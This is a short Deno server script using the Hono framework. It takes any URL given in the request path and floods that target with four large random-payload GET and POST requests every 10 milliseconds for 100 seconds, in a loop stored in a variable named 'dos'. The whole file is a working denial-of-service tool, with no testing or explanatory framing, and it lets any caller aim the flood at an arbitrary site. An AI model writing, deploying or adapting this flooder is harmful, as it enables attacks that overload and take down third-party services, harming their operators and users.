import { Hono } from "https://deno.land/x/hono@v3.4.1/mod.ts";
import data from "./data.json" assert { type: "json" };

const app = new Hono();

app.all("/:url", async (c) => {
  const dos = setInterval(async () => {
    fetch(c.req.params.url, {
      method: "GET",
      body: "a=" + Math.random().toString(36).repeat(10000)
    })
    fetch(c.req.params.url, {
      method: "POST",
      body: "a=" + Math.random().toString(36).repeat(10000)
    })
    fetch(c.req.params.url, {
      method: "GET",
      body: "a=" + Math.random().toString(36).repeat(10000)
    })
    fetch(c.req.params.url, {
      method: "POST",
      body: "a=" + Math.random().toString(36).repeat(10000)
    })
  }, 10)

  setTimeout(() => clearInterval(dos), 100000)
});

Deno.serve(app.fetch);
